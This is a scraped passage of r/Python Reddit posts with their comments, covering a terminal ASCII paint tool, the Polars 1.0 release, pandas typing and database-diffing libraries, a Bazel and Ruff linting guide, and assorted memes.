    "post_time": "Friday, June 28, 2024 at 3:37:07 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "the Dumb Paint Tool - A terminal ASCII painter written in python",
    "media": [
        "https://www.reddit.com/r/unixporn/comments/1b50jat/xterm_terminal_multiplexer_with_a_parallax/",
        "https://github.com/ceccopierangiolieugenio/pyTermTk",
        "https://en.wikipedia.org/wiki/GNOME_Terminator",
        "https://pypi.org/project/dumbPaintTool",
        "https://github.com/microsoft/terminal",
        "https://www.youtube.com/watch?v=8MesNrUF6JI",
        "https://ceccopierangiolieugenio.itch.io/a-snake-on-a-plane",
        "https://ceccopierangiolieugenio.itch.io/dumb-paint-tool",
        "https://github.com/ceccopierangiolieugenio/pyTermTk/tree/main/tools/dumbPaintTool",
        "https://support.apple.com/en-gb/guide/terminal/welcome/mac",
        "https://en.wikipedia.org/wiki/Xterm"
    ],
    "post_content": "·▄▄▄▄   •   •    ▗▄.\n██▪ ██  ▪ ▂  ▃ ▂ ▕█▖     ▂                  ▂▂▁\n▐█· ▐█▌█▌ █▌▐▀█ ▊ █▀▜▄    █▙▄▄·    · ╋      ▝█▘\n██. ██ ▐█▄█ █ ▘▗█ █▖ █    ▐█ ▄█ ▂▂ ▪ ▄ ▁▂▁• ·█▌▪\n▀▀▀▀▀•  ▀▀▀▌▀▘ ▝▀▪▐▀▀▀   • ██▀ ▗▃▟▌ ▐▌▝█▛▜▙· █▙▄▟ ·\n   ▄▄▄▄▄            ▄▄▌   ▐█▪· ▟▁·▙ ▐█ █·▪█▏▕█· ▀•\n   •██  ▪     ▪     ██•   .▀   ▀▀▀▀▘▝▀ ▀▘ ▀▘ ▀▙▄▄▟\n    ▐█.▪ ▄█▀▄  ▄█▀▄ ██▪\n    ▐█▌·▐█▌.▐▌▐█▌.▐▌▐█▌▐▌\n    ▀▀▀  ▀█▄▀▪ ▀█▄▀▪.▀▀▀\nWhat My Project Does\nthe Dumb Paint Tool is a Terminal ASCII paint toolkit written in Python\nVideo Showcase\nhttps://www.youtube.com/watch?v=8MesNrUF6JI\nProject\nhttps://github.com/ceccopierangiolieugenio/pyTermTk/tree/main/tools/dumbPaintTool\n(Web Version) itch.io\nhttps://ceccopierangiolieugenio.itch.io/dumb-paint-tool\nTarget Audience\nAnyone that want to explore the ansii/ascii ART capabilities. It can be used for example to improve the terminal prompt aestetics. I personally used it to make the art for: A Snake🐍 on a Plane✈️ - The Roguelike or the parallax scrolling terminal multiplexer\nFeatures\nPure Cross Compatible Terminal App (it runs on xterm or Terminator or MacOS Terminal or Windows Terminal or . . .)\nDid I mention it is a Terminal App? You can run it via SSH, Telnet or Serial\nWide variety of glyphs (UTF-8)\nWide Variety of tools\nCopy and Paste from the terminal or the web app\nDrag files to be open (WebVersion Only)\nImage/Pictures import with configurable ASCII rasterizers\nLayers\nIntelligent Transparent Layers\nBeautiful Dumb Transparent Layers\nANSI/ASCII Export\nUnlimited Undo/Redo\nAnd more to come . . .\nMade using:\npyTermTk a magical mesmerising self contained spicy🌶️ Python TUI library\nInstallation\nTry it live on itch.io\nor install it from pypi:\n    pip install dumbPaintTool --upgrade\n    \n    dumbPaintTool",
    "comments": [
        {
            "author": "ylyi",
            "score": "11",
            "content": "cool",
            "replies": [
                {
                    "author": "ylyi",
                    "score": "5",
                    "content": "just saw the showcase video, WOW extremely cool"
                }
            ]
        },
        {
            "author": "blindcamel",
            "score": "3",
            "content": "Sure dumbPaintTool is sweet, but that sick bass groove.",
            "replies": [
                {
                    "author": "PierCecco",
                    "score": "1",
                    "content": "hahaha, thanks, I am still not ready to use my voice on youtube, I need to rely on some catchy bg theme."
                }
            ]
        },
        {
            "author": "exxy-",
            "score": "3",
            "content": "this is very cool and I like your vibe, man.",
            "replies": [
                {
                    "author": "PierCecco",
                    "score": "1",
                    "content": "Hehehe, Thanks"
                }
            ]
        },
        {
            "author": "XUtYwYzz",
            "score": "2",
            "content": "Very cool. Great execution. First I’ve seen of pyTermTk.",
            "replies": [
                {
                    "author": "PierCecco",
                    "score": "1",
                    "content": "thanks"
                }
            ]
        },
        {
            "author": "ImClearlyDeadInside",
            "score": "1",
            "content": "Damnit… I had this idea years ago but was too lazy to implement it :c"
        }
    ]
},
{
    "post_author": "ritchie46",
    "post_id": "1dspxnn",
    "post_score": "586",
    "post_time": "Monday, July 1, 2024 at 1:44:51 PM GMT+3",
    "flair_text": "News",
    "post_title": "Python Polars 1.0 released",
    "media": [
        "https://github.com/pola-rs/polars/releases/tag/py-1.0.0",
        "https://docs.pola.rs/releases/upgrade/1/",
        "https://pola.rs/posts/announcing-polars-1"
    ],
    "post_content": "I am really happy to share that we released Python Polars 1.0.\nRead more in our blog post. To help you upgrade, you can find an upgrade guide here. If you want see all changes, here is the full changelog.\nPolars is a columnar, multi-threaded query engine implemented in Rust that focusses on DataFrame front-ends. It's main interface is Python. It achieves high performance data-processing by query optimization, vectorized kernels and parallelism.\nFinally, I want to thank everyone who helped, contributed, or used Polars!",
    "comments": [
        {
            "author": "wdroz",
            "score": "70",
            "content": "Thank you and congratulations! Polars is a really good selling point for the interoperability between Python and Rust.",
            "replies": [
                {
                    "author": "Verochio",
                    "score": "16",
                    "content": "I’m a big convert to Polars, but it’s delegation of everything to Rust, whilst clearly the correct choice, does mean I get lost very quickly when I want to “look under the hood”. It’s a price I’m willing to pay, but the one (and only) thing I miss about pandas is that I could go to GitHub and see what a function was actually doing. I suppose I probably should learn Rust at some point."
                }
            ]
        },
        {
            "author": "VectorTwoFiveZero",
            "score": "124",
            "content": "This was just maturing as I was retiring, but for the short time I used it it was game-changing. Thanks for the work on this."
        },
        {
            "author": "New_Computer3619",
            "score": "18",
            "content": "Congratulations. Great library. Last time I checked, you are working on a new streaming engine. Is it stabilized in this release? Thanks.",
            "replies": [
                {
                    "author": "ritchie46",
                    "score": "19",
                    "content": "No, it is not. We are discontinuing the old streaming engine and are currently writing the new one. This will however not be user facing and we can swap the two engines without needing a breaking release. I can say, we are make good progress. But I want to share more once we can run a significant part of TPC-H on that new one. What we are stabilizing in this release is the in-memory engine and the API of Polars."
                }
            ]
        },
        {
            "author": "AeHirian",
            "score": "30",
            "content": "Okay, now I've heard Polars mentioned several times but I still don't quite understand how it is different from pandas? Would anyone care to explain? Would be much apreciated",
            "replies": [
                {
                    "author": "ritchie46",
                    "score": "93",
                    "content": "Polars aims to be a better pandas, with less user bugs (due to being stricter), more performance and more scalability. It is a query engine with a query optimizer that is written for maximum performance on a single machine. It achieves this by: pruning operations that are not needed (the optimizer) executing operations in parallel effectively, Either via workstealing and low contention algorithms and/or via morsel driven parallelism (both require no serialization and are low contention) vectorized columnar processing where we rely on explicit SIMD or autovectorization dedicated IO integration with the optimizer, pushing predicates and projections into the readers and ensuring we don't materialize what er don't use various other reasons like dedicated datatypes, buffer reuse, copy on write, cache efficient algorithms, etc. Other than that; Polars designed an API that is more strict, but also more versatile than that of pandas. Via strictness, we aim to catch bugs early. Polars has a type system and knows of each operation what the output type is before running the query. Via its expression, Polars allows you to combine computations in a powerful manner. This means you actually require much less methods than in the pandas API, because in Polars you are able to create much more via expressions. We are also designing our new streaming engine to be able to spill to disk if you exceed RAM usage (our current streaming already does that, but will be discontinued). Lastly; I want to mention Polars plugins, which allow you to register any expression into the Polars engine. Hereby you inherit parallelism and query optimization for free and you completely sideline Python, so no GIL locking. This allows you to take some complicated algorithm from crates.io (Rusts package manager) and get the a specific expression for your needs without being reliant on Polars to develop it."
                },
                {
                    "author": "QueasyEntrance6269",
                    "score": "12",
                    "content": "Polars is just pandas with sane defaults and a built-in query engine that means regardless of the trash code you write, it will optimize it down into something more efficient when you’re actually interested in the results and not the intermediary steps"
                },
                {
                    "author": "Zafara1",
                    "score": "18",
                    "content": "Polars can be significantly faster at processing large data frame operations. Like a 10x speed improvement. Pandas has a larger feature set and a bigger community meaning more help and tutorials on use and more options for use especially when it comes to compatibility."
                },
                {
                    "author": "XtremeGoose",
                    "score": "13",
                    "content": "If you've used both the difference is honestly night and day, just from the API (ignoring all the performance improvements). Polars is a query engine, it's built declaratively so it can do query optimisations (much like sql), allowing it to be performant even in bigger-than-memory data. Pandas is more like spreadsheets in python, everything has to be computed and allocated up front."
                }
            ]
        }
    ]
},
{
    "post_author": "kookeo",
    "post_id": "hg9sk8",
    "post_score": "4444",
    "post_time": "Friday, June 26, 2020 at 6:34:38 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "The only way to satisfy a programmer on his birthday!",
    "media": [
        "https://i.redd.it/cbz37hmdx9751.jpg",
        "https://preview.redd.it/cbz37hmdx9751.jpg?width=640&crop=smart&auto=webp&s=4a59bcdc408404ed3f5740b91ded1db8d4474ded"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "krusher988",
            "score": "2682",
            "content": "",
            "replies": [
                {
                    "author": "kookeo",
                    "score": "784",
                    "content": ""
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "173",
            "content": ""
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "STOP REFACTORING MY BIRTHDAY CAKE",
            "replies": [
                {
                    "author": "TinMayn",
                    "score": "39",
                    "content": "STOP REFACTORING MY BIRTHDAY CAKE"
                }
            ]
        }
    ]
},
{
    "post_author": "LAMagicx",
    "post_id": "dg0etx",
    "post_score": "5173",
    "post_time": "Thursday, October 10, 2019 at 7:21:30 PM GMT+3",
    "flair_text": "",
    "post_title": "Just trying to create a orbit system in python and this happened...",
    "media": [
        "https://external-preview.redd.it/1LJLp8_Xgs652yuFMSVhzlT2fPiGDfJUNuA7iINCehQ.png?width=640&crop=smart&format=pjpg&auto=webp&s=160dab2aa711881936c1cc2f753fc8cbac2685fd"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Grow-away123",
            "score": "711",
            "content": "",
            "replies": [
                {
                    "author": "LAMagicx",
                    "score": "283",
                    "content": ""
                }
            ]
        },
        {
            "author": "lilgreenwein",
            "score": "449",
            "content": "",
            "replies": [
                {
                    "author": "a22e",
                    "score": "152",
                    "content": ""
                }
            ]
        },
        {
            "author": "el_matt",
            "score": "113",
            "content": "r/dark Sic mundus creatus est."
        }
    ]
},
{
    "post_author": "houseofleft",
    "post_id": "1dqm1y4",
    "post_score": "23",
    "post_time": "Friday, June 28, 2024 at 6:15:47 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Atollas - a column level type system for pandas",
    "media": [
        "https://github.com/benrutter/atollas"
    ],
    "post_content": "Hey folks!\nI do a lot of stuff professionally with pandas and dask, and I always reeeeaaaly wish that they had a column level type system. I feel like a lot of bugs like, one-to-one joins on non unique columns, or just plain old incorrect source data would be quicker to find if there was one.\nSo I've written one - or at least started to. It's pretty early stage, but I'm pretty excited about it as an idea. Would love some feedback people (especially ones that work with pandas a lot)!\nSo here's my little project, hope it's interesting to someone!\nWhat my Project Does\nProvides a column level type system for pandas, to catch bugs earlier and check for things like, join operation validity.\nTarget Audience\nPeople looking to put pandas code into production with better reliability that pandas provides out the box.\nComparison\nI don't know of any 1-2-1 comparison, things like polars have good type checking internally, but don't make any attempt to type check columns. Pandera is the closest project, which gives a decorator to enforce schemas at type boundaries)",
    "comments": [
        {
            "author": "htmx_enthusiast",
            "score": "11",
            "content": "Why not use pyarrow to specify a schema and validate it?",
            "replies": [
                {
                    "author": "houseofleft",
                    "score": "7",
                    "content": "The benefit is it's a type system so you get additional guarantees. It's a little like in python, the difference between this: x: int = 4 and this x = 4 assert isinstance(x, 4) The first one, in combo with something like mypy will check that the rest of your code is accurate given the types (so if you later do some operation like x.strftime(\"%Y\") then mypy will tell you you can't, you won't get that with the second)"
                }
            ]
        },
        {
            "author": "PurepointDog",
            "score": "15",
            "content": "Just use Polars",
            "replies": [
                {
                    "author": "houseofleft",
                    "score": "1",
                    "content": "I love polars! But I'm pretty sure it (like pandas) doesn't have a column level type system. You can choose to give a schema at read, but it isn't enforced later on in your code, and doesn't inclide expression of things like uniqueness or nullability?"
                }
            ]
        },
        {
            "author": "Double-Process-4848",
            "score": "4",
            "content": "What advantages does this offer over pandera?",
            "replies": [
                {
                    "author": "houseofleft",
                    "score": "1",
                    "content": "This point gets mentioned in the readme- tries to do something a little differently, i.e. type data frames and then validate operations on that basis. Whilst pandera gives you functions to check schemas are valid at key points. That said- this is nowhere near ready for production or anything like that, so if you're looking to actually type pandas dataframes in production, pandera is gonna be a better choice across the board."
                }
            ]
        },
        {
            "author": "AnythingApplied",
            "score": "2",
            "content": "What makes your cardinality different than merge's validate argument?",
            "replies": [
                {
                    "author": "houseofleft",
                    "score": "3",
                    "content": "Good question! The key difference is that it's type based. So rather than checking what happened at run time, it validiates that the merge is reliable given your types. That's sort of the whole deal with most of this library- you specify types once at read, and then Atollas keeps track of what operations are valid given your types. You get guarantees about your operations validity rather than needing to Chen that things worked as you thought they would throughout the code."
                }
            ]
        }
    ]
},
{
    "post_author": "erez27",
    "post_id": "1dncta4",
    "post_score": "38",
    "post_time": "Monday, June 24, 2024 at 3:56:10 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Reladiff - High-performance diffing of large datasets across databases",
    "media": [
        "https://github.com/erezsh/reladiff"
    ],
    "post_content": "Hi everyone!\nI'm here to announce my open-source project Reladiff.\nI hope some of you will find it useful!\nWhat My Project Does\nReladiff is a python library for diffing data across databases (e.g. postgres<->snowflake), and it can handle very large tables with blazing speeds, by running the diff in the database itself.\nThe API is pretty simple, and highly customizable. Here's the \"Hello World\":\nfrom reladiff import connect_to_table, diff_tables\n\ntable1 = connect_to_table(\"postgresql:///\", \"table_name\", \"id\")\ntable2 = connect_to_table(\"mysql:///\", \"table_name\", \"id\")\n\nsign: Literal['+' | '-']\nrow: tuple[str, ...]\nfor sign, row in diff_tables(table1, table2):\n    print(sign, row)\nTarget Audience\nData professionals\nDevOps engineers\nSystem administrators.\nReladiff is safe for use in production.\nComparison\nReladiff is a fork of a project called \"data-diff\". I was the main developer for data-diff until last year. It was recently abandoned and archived by its sponsoring company, which is why I'm doing this fork. I kept it mostly as-is, but I fixed the documentation, removed all the tracking code, and the dbt integration.\nOther than that, I'm not aware of any relevant open-source alternative. But I'll be happy to find one.\nSource\nhttps://github.com/erezsh/reladiff",
    "comments": [
        {
            "author": "Little_Station5837",
            "score": "1",
            "content": "Why remove the dbt integration? Looking to add this in my CI, but perhaps it can be done with python instead even if one uses dbt?",
            "replies": [
                {
                    "author": "erez27",
                    "score": "1",
                    "content": "You can use Reladiff from dbt without any issue, either as a Python library or as a shell command. The dbt integration was a feature for reading the run config automatically from dbt, instead of having to specify it. I removed the dbt integration because I thought it was bad design. But I might consider re-adding it as a separate command, e.g. reladiff-dbt."
                }
            ]
        },
        {
            "author": "SeaCompetitive5704",
            "score": "2",
            "content": "Thanks for the work! I was looking for an alternative to data-diff and I stumbled on this. I’ll give it a try. Another person voiced this, but I think if reladiff can integrate with dbt, it would be great. I’m doing all of my data test on dbt now, and if this tool can work with dbt that would be really convenient"
        }
    ]
},
{
    "post_author": "wilson_wilson_wilson",
    "post_id": "1dtzb9f",
    "post_score": "0",
    "post_time": "Wednesday, July 3, 2024 at 2:00:41 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Caught between Reflex and the traditional approach (Django/Next.js)",
    "media": [],
    "post_content": "Relatively new to development.\nI am working on a simple chat bot for people with ADHD. I have the basics working in pure python.\nI messed around with almost every full stack framework so far.\nI recently found Reflex but the down side is it's kinda new, not a whole lot or resources out there and AIs don't have a lot of context to help.\nI love the idea of full stack python but I want to get into WebXR dev soon anyway so I'm think I just bite the bullet and learn JS and just do a Django backend?\nOr full send learn Next.js for front and back??\nLooking for advice from anybody who's been here.",
    "comments": [
        {
            "author": "athermop",
            "score": "2",
            "content": "No need to limit yourself to just one. You'll be a better developer each language and framework you learn as there's often lessons and ideas to transfer around."
        },
        {
            "author": "j_safernursing",
            "score": "1",
            "content": "Buildling a whole CRUD site in reflex right now. It's very easy but it can be tricky to pick up how reflex needs things to get handled. Once you get there its a breeze."
        }
    ]
},
{
    "post_author": "professormunchies",
    "post_id": "gbko3e",
    "post_score": "5073",
    "post_time": "Friday, May 1, 2020 at 6:54:41 PM GMT+3",
    "flair_text": "Image Processing",
    "post_title": "Dev'ing an app to help visualize data from any matplotlib figure",
    "media": [
        "https://gfycat.com/lineartangeese-application-visualizer-visualizar-augmented-data"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "zealothree",
            "score": "691",
            "content": "Thats some iron man shit right there",
            "replies": [
                {
                    "author": "grudev",
                    "score": "53",
                    "content": "Nothing left to say."
                }
            ]
        },
        {
            "author": "dtbrough",
            "score": "180",
            "content": "Any chance of sharing the source code? Would love to have a play with that myself.",
            "replies": [
                {
                    "author": "professormunchies",
                    "score": "236",
                    "content": "You can follow the dev progress here: https://github.com/pearsonkyle/Data-VisualizAR I'll open source the app in 2-3 weeks or so...I need to polish the color-map inversion because it only works for rainbow colormaps at the moment."
                }
            ]
        }
    ]
},
{
    "post_author": "Igor_d7",
    "post_id": "e9fgjp",
    "post_score": "4387",
    "post_time": "Thursday, December 12, 2019 at 2:51:02 AM GMT+3",
    "flair_text": "",
    "post_title": "Happy Holidays! Made a user-directed greeting card using Python Turtle Graphics",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "UngodlySp00n",
            "score": "637",
            "content": "Upvoted for the breaking window animation 😂"
        },
        {
            "author": "Eledridan",
            "score": "80",
            "content": "“Do you want the sky to be black or sky blue?” I didn’t realize black sky meant night and thought this program was going to be metal."
        },
        {
            "author": "testfire10",
            "score": "101",
            "content": "Excellent work. This is the kind of content I need to see as a python newbie. Now, about that code..."
        },
        {
            "author": "Saiboo",
            "score": "32",
            "content": "Very cool and creative idea! Do you have the code somewhere up?"
        },
        {
            "author": "Jsmith4523",
            "score": "24",
            "content": "You really missed the opportunity to say “Do you want to build a snowman?”"
        },
        {
            "author": "DARPA1191969v1",
            "score": "18",
            "content": "Hell's Pass Hospital!"
        },
        {
            "author": "SolarFlareWebDesign",
            "score": "15",
            "content": "Curious about the text - is that also Turtle? Or other?"
        },
        {
            "author": "Er1ss4",
            "score": "10",
            "content": "I love it and all, but why wouldn't you put that space at the end of input()?"
        },
        {
            "author": "otterom",
            "score": "10",
            "content": "The user input part is the best. Lol I thought the questions would just keep getting more ridiculous and there wouldn't be a card at all."
        },
        {
            "author": "HoloCookie",
            "score": "13",
            "content": "Love that cybertruck!"
        }
    ]
},
{
    "post_author": "HP7933",
    "post_id": "1dqkmj1",
    "post_score": "9",
    "post_time": "Friday, June 28, 2024 at 5:13:50 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "The Python on Microcontrollers (and Raspberry Pi) Newsletter, a weekly news and project resource",
    "media": [
        "https://www.adafruitdaily.com/"
    ],
    "post_content": "The Python on Microcontrollers (and Raspberry Pi) Newsletter: subscribe for free\nWith the Python on Microcontrollers newsletter, you get all the latest information on Python running on hardware in one place! MicroPython, CircuitPython and Python on single Board Computers like Raspberry Pi & many more.\nThe Python on Microcontrollers newsletter is the place for the latest news. It arrives Monday morning with all the week’s happenings. No advertising, no spam, easy to unsubscribe.\n11,116 subscribers - the largest Python on hardware newsletter out there.\nCatch all the weekly news on Python for Microcontrollers with adafruitdaily.com.\nThis ad-free, spam-free weekly email is filled with CircuitPython, MicroPython, and Python information that you may have missed, all in one place!\nEnsure you catch the weekly Python on Hardware roundup– you can cancel anytime – try our spam-free newsletter today!\nhttps://www.adafruitdaily.com/",
    "comments": [
        {
            "author": "ericjmorey",
            "score": "1",
            "content": "Are there any recent articles or links provided by the newsletter that you found interesting?",
            "replies": [
                {
                    "author": "HP7933",
                    "score": "2",
                    "content": "Yes, many (I tend to only put in interesting bits). Each week, 30-40 links to fresh content to browse."
                }
            ]
        }
    ]
},
{
    "post_author": "Spindelkryp",
    "post_id": "1dmk3i5",
    "post_score": "16",
    "post_time": "Sunday, June 23, 2024 at 2:30:24 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Linting Python Monorepo with Bazel and Ruff",
    "media": [
        "https://docs.astral.sh/ruff/",
        "https://github.com/philipuvarov/bazel-ruff",
        "https://bazel.build/",
        "https://philuvarov.io/bazel-can-be-ruff/"
    ],
    "post_content": "Heya, I have recently integrated Ruff in the Bazel monorepo of my company. The results were quite impressive, it takes around ~100ms to analyze and apply format / lint results to 1.1k python files.\nIntegration with Bazel, however, was not exactly painless so I wrote a small guide for it as well as an example project.. Hope it helps someone!\nWhat My Project Does\nGuide on how to setup Ruff linting for Bazel based Python projects\nTarget Audience\nMaintainers of large Python repos\nSource code\nHow-to guide\nSource code",
    "comments": [
        {
            "author": "lanster100",
            "score": "3",
            "content": "Nice writeup thanks, what benefits does Bazel bring? Looks like a lot of setup to just run linting across a repo. I know the monorepo support in python is practically nonexistent though.",
            "replies": [
                {
                    "author": "Spindelkryp",
                    "score": "4",
                    "content": "It’s good question! Solely for python you probably don’t need Bazel. In our case, monorepo has all kind of stuff in it like Go microservices, Python scripts, some Rust stuff, etc. in this case Bazel is a system that can build it all, which is quite handy since if you are jumping between different languages in monorepo you don’t need to learn about specific build system. Another benefit that has been mentioned is caching, Bazel is quite smart about that, out of the box it will rebuild / run tests for stuff was changed / affected by your change, which is quite great for CI times. That being said, I am in a bit of a love-hate relationship with Bazel and if you don’t have a project size of TensorFlow(which uses Bazel) you probably don’t need it"
                },
                {
                    "author": "mattl33",
                    "score": "1",
                    "content": "Someone else can probably explain it better but bazel will cache any build steps for all projects within the repo, and tracks which files changed so it knows what to process and what can use the cache. It can also help manage who can change what within the repo so different teams can manage their own stuff. Afaik it basically solves all the things people complain about with monorepos."
                }
            ]
        },
        {
            "author": "elephantum",
            "score": "1",
            "content": "",
            "replies": [
                {
                    "author": "Spindelkryp",
                    "score": "2",
                    "content": ""
                }
            ]
        },
        {
            "author": "SciEngr",
            "score": "0",
            "content": "Aspect has a rules_lint library for doing this: https://github.com/aspect-build/rules_lint",
            "replies": [
                {
                    "author": "Spindelkryp",
                    "score": "1",
                    "content": "Yes, in the post I mention them as a considered alternative. The problem there is that you need to override bazel CLI tool or run some .sh script. Both options add some friction, same goes for running it on CI. Aspect rules are fine, for this particular thing I felt like this setup is just more future proof since we are not adding new third party tools + plus the amount of setup you need to DIY is kinda equal to integrating Aspect rules anyway. Edit: link"
                }
            ]
        }
    ]
},
{
    "post_author": "erez27",
    "post_id": "1dncta4",
    "post_score": "38",
    "post_time": "Monday, June 24, 2024 at 3:56:10 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Reladiff - High-performance diffing of large datasets across databases",
    "media": [
        "https://github.com/erezsh/reladiff"
    ],
    "post_content": "Hi everyone!\nI'm here to announce my open-source project Reladiff.\nI hope some of you will find it useful!\nWhat My Project Does\nReladiff is a python library for diffing data across databases (e.g. postgres<->snowflake), and it can handle very large tables with blazing speeds, by running the diff in the database itself.\nThe API is pretty simple, and highly customizable. Here's the \"Hello World\":\nfrom reladiff import connect_to_table, diff_tables\n\ntable1 = connect_to_table(\"postgresql:///\", \"table_name\", \"id\")\ntable2 = connect_to_table(\"mysql:///\", \"table_name\", \"id\")\n\nsign: Literal['+' | '-']\nrow: tuple[str, ...]\nfor sign, row in diff_tables(table1, table2):\n    print(sign, row)\nTarget Audience\nData professionals\nDevOps engineers\nSystem administrators.\nReladiff is safe for use in production.\nComparison\nReladiff is a fork of a project called \"data-diff\". I was the main developer for data-diff until last year. It was recently abandoned and archived by its sponsoring company, which is why I'm doing this fork. I kept it mostly as-is, but I fixed the documentation, removed all the tracking code, and the dbt integration.\nOther than that, I'm not aware of any relevant open-source alternative. But I'll be happy to find one.\nSource\nhttps://github.com/erezsh/reladiff",
    "comments": [
        {
            "author": "Little_Station5837",
            "score": "1",
            "content": "Why remove the dbt integration? Looking to add this in my CI, but perhaps it can be done with python instead even if one uses dbt?",
            "replies": [
                {
                    "author": "erez27",
                    "score": "1",
                    "content": "You can use Reladiff from dbt without any issue, either as a Python library or as a shell command. The dbt integration was a feature for reading the run config automatically from dbt, instead of having to specify it. I removed the dbt integration because I thought it was bad design. But I might consider re-adding it as a separate command, e.g. reladiff-dbt."
                }
            ]
        },
        {
            "author": "SeaCompetitive5704",
            "score": "2",
            "content": "Thanks for the work! I was looking for an alternative to data-diff and I stumbled on this. I’ll give it a try. Another person voiced this, but I think if reladiff can integrate with dbt, it would be great. I’m doing all of my data test on dbt now, and if this tool can work with dbt that would be really convenient"
        }
    ]
},
{
    "post_author": "Nicolas-Rougier",
    "post_id": "hmoabi",
    "post_score": "5034",
    "post_time": "Tuesday, July 7, 2020 at 8:10:27 AM GMT+3",
    "flair_text": "Scientific Computing",
    "post_title": "I've designed brand new cheatsheets (x2) and handouts (x3) for matplotlib",
    "media": [
        "https://external-preview.redd.it/ghpC4ErYDSFJBvuYRzY7KzW3s9utY9lzSl4g8q_-_sQ.png?width=640&crop=smart&auto=webp&s=e342d3ebd9f8c126ab6bb1d0b80ef85da2b1ff19",
        "https://raw.githubusercontent.com/matplotlib/cheatsheets/master/cheatsheets-1.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Nicolas-Rougier",
            "score": "156",
            "content": "Sources at https://github.com/matplotlib/cheatsheets",
            "replies": [
                {
                    "author": "aaronpenne",
                    "score": "26",
                    "content": ""
                }
            ]
        },
        {
            "author": "drkaczur",
            "score": "34",
            "content": ""
        },
        {
            "author": "[deleted]",
            "score": "28",
            "content": "Thanks man, this will actually come in handy for me. Great Share!"
        },
        {
            "author": "narfel",
            "score": "25",
            "content": "Yeah, but did you do create them with matplotlib? Back to the drawing board... (just kidding of course,great work and much appreciated)"
        }
    ]
},
{
    "post_author": "Aggressive-Dig3465",
    "post_id": "1dt7ik7",
    "post_score": "30",
    "post_time": "Tuesday, July 2, 2024 at 2:35:52 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "I created my first GUI Python app.",
    "media": [
        "https://github.com/khalildim/youtube_downloader"
    ],
    "post_content": "I have developed an application that allows users to download audio and videos from YouTube. You can check out the project on my GitHub: https://github.com/khalildim/youtube_downloader. I'm looking for some advice and feedback to improve the app.",
    "comments": [
        {
            "author": "ogMasterPloKoon",
            "score": "12",
            "content": "nice start ... since there are tons of such GUIs available already you need to make it stand out by adding features that are missing from the available ones. Extend it further and you will also get to learn a lot of things and this project will stay longer and will not die out..... Good luck ✌🤝",
            "replies": [
                {
                    "author": "Aggressive-Dig3465",
                    "score": "6",
                    "content": "thanks ✌️"
                }
            ]
        },
        {
            "author": "FisterMister22",
            "score": "3",
            "content": "Nice!!",
            "replies": [
                {
                    "author": "yrubooingmeimryte",
                    "score": "-18",
                    "content": ""
                }
            ]
        },
        {
            "author": "yrubooingmeimryte",
            "score": "-36",
            "content": "",
            "replies": [
                {
                    "author": "PossibilityTasty",
                    "score": "34",
                    "content": "You are a motivation expert. Someone creates a first GUI application and all you have to say is: \"I have seen better\"."
                },
                {
                    "author": "DanielTheTechie",
                    "score": "14",
                    "content": "Why writing a \"Hello World\" program when starting to learn coding if there are already millions of them that have more options? If you don't start your learning journey by writing the embedded OS kernel of the first rocket that will land people to Mars, then you are wasting your time."
                }
            ]
        }
    ]
},
{
    "post_author": "Alexanderdaawesome",
    "post_id": "cmdbuf",
    "post_score": "4286",
    "post_time": "Monday, August 5, 2019 at 7:38:00 PM GMT+3",
    "flair_text": "",
    "post_title": "Python's response to MATLAB",
    "media": [
        "https://i.redd.it/lunmi0varne31.jpg",
        "https://preview.redd.it/lunmi0varne31.jpg?auto=webp&s=540465d152400d0246d2d03b4278ddf737c09ef6"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "aaronr_90",
            "score": "77",
            "content": "",
            "replies": [
                {
                    "author": "Deezl-Vegas",
                    "score": "78",
                    "content": ""
                }
            ]
        },
        {
            "author": "Stereoisomer",
            "score": "426",
            "content": "",
            "replies": [
                {
                    "author": "Alexanderdaawesome",
                    "score": "31",
                    "content": ""
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "125",
            "content": "Why would matlab feel bad for python?"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dqy1qp",
    "post_score": "1",
    "post_time": "Saturday, June 29, 2024 at 3:00:11 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Saturday Daily Thread: Resource Request and Sharing! Daily Thread",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Russjass",
            "score": "1",
            "content": "Looking for: Resources for beginner to intermediate image processing, particularly image warping and co-registering."
        },
        {
            "author": "VettedBot",
            "score": "1",
            "content": "Hi, I’m Vetted AI Bot! I researched the 'O'Reilly Media Fluent Python' and I thought you might find the following analysis helpful. Users liked: In-depth and pythonic content (backed by 3 comments) Great for experienced programmers (backed by 3 comments) Helps improve coding skills (backed by 3 comments) Users disliked: Not suitable for beginners (backed by 3 comments) Issues with kindle edition (backed by 3 comments) Poor bookbinding quality (backed by 1 comment) Do you want to continue this conversation? Learn more about 'O'Reilly Media Fluent Python' Find 'O'Reilly Media Fluent Python' alternatives This message was generated by a (very smart) bot. If you found it helpful, let us know with an upvote and a “good bot!” reply and please feel free to provide feedback on how it can be improved. Powered by vetted.ai"
        }
    ]
},
{
    "post_author": "rnv812",
    "post_id": "1dkvsmy",
    "post_score": "13",
    "post_time": "Friday, June 21, 2024 at 7:50:28 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Eventum: Flexible event generator",
    "media": [
        "https://eventum-generatives.github.io/Website/",
        "https://github.com/Eventum-Generatives/EventumCore"
    ],
